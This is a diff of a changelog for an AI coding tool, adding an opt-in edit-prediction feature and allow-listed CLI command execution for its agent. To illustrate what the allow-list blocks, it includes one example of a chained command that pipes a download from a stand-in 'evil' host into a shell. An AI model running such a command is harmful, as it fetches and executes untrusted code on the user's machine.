@@ -1,6 +1,10 @@
 # Changelog
 
 ## Unreleased
+### Edit prediction (research gap #5)
+- Ghost-text completions at the cursor, accepted with Tab (Monaco inline completions). **Off by default**: with it off, nothing is sent (the e2e asserts zero requests). Turning it on in settings shows plainly that the code around the cursor goes to the model each time you pause, and warns when the provider is not on this machine; local-only mode still blocks off-machine requests because it goes through the same guarded gateway. Pauses of 350 ms debounce it, in-flight requests are cancelled when you keep typing, replies are capped (12 lines / 800 chars) and cleaned (fences, the already-typed part of the line, and characters that already follow the cursor are removed), and it skips an empty file or the middle of a word. A separate `Completion model` setting lets you use a small fast model.
+- Verified with unit tests and a real-window e2e against a mock server. **Not verified:** completion quality with a real model. It uses a chat-style prompt that works with any model; models with native fill-in-the-middle support would likely do better, which is future work.
+
 ### CLI command execution (`--allow`)
 - `forge-code run "..." --allow "npm test" --allow "npm run lint*"` lets the agent run those commands, so it can run the tests, read the real failures and fix the code (verified end to end with a failing check that the agent repairs). Nothing runs unless allowed; a trailing `*` allows any arguments but never chained, piped, substituted or redirected commands (`npm test*` does not permit `npm test; curl evil | sh`); the catastrophic-command deny list applies even to allowed patterns; background processes are not offered. **Important limit:** the CLI runs commands with a scrubbed environment but without the OS sandbox the desktop app uses, and the tool description tells the model exactly that.
 - `nodeExec` now kills the whole process tree on timeout (it killed only the shell on Linux and macOS, which could leave the call hanging). Verified on Windows locally; the Unix path is checked by CI.
